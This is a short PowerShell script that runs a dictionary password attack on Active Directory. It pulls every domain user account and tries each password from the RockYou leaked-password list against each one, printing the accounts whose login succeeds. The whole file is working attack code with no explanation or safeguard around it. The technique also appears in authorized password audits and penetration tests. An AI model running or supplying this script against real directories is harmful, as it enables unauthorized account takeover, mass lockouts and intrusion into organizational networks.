Function Test-ADAuthentication {

    param(

        $username,

        $password)

 

    (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null

}

 

$users = Get-ADUser -Filter * | select SamAccountName

 

foreach ($user in $users){

foreach($line in [System.IO.File]::ReadLines("Q:\Users\e_kacmaz\Desktop\RockYou.txt")){

if($(Test-ADAuthentication -username $user.SamAccountName -password $line.ToString()) -eq "True"){

 

    Write-Host $user.SamAccountName

}

    }

 

        }
